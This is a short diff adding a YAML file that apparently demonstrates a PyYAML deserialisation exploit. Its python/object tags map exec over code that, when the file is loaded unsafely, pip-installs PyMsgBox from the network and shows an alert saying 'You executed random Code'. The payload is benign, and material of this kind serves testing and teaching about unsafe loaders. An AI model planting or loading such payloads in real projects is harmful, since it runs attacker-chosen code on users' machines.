@@ -1,0 +1,8 @@
+!!python/object/new:tuple 
+- !!python/object/new:map 
+  - !!python/name:exec
+  - [ import subprocess,
+      import sys,
+      'subprocess.check_call([sys.executable, "-m", "pip", "install",  "-q", "PyMsgBox"])',
+      import pymsgbox,
+      'pymsgbox.alert("Congratulation", "You executed random Code")']
